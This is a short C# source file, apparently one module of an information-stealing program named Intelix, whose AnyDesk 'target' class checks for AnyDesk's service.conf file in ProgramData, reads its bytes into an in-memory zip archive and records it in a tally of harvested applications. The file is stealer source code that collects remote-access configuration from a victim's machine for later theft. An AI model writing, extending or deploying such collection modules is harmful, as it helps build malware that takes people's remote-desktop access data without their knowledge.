using System.IO;
using Intelix.Helper.Data;

namespace Intelix.Targets.Applications;

public class AnyDesk : ITarget
{
	public void Collect(InMemoryZip zip, Counter counter)
	{
		string text = "C:\\ProgramData\\AnyDesk\\service.conf";
		if (File.Exists(text))
		{
			string text2 = "AnyDesk\\service.conf";
			Counter.CounterApplications counterApplications = new Counter.CounterApplications();
			counterApplications.Name = "AnyDesk";
			counterApplications.Files.Add(text + " => " + text2);
			counter.Applications.Add(counterApplications);
			zip.AddFile(text2, File.ReadAllBytes(text));
		}
	}
}
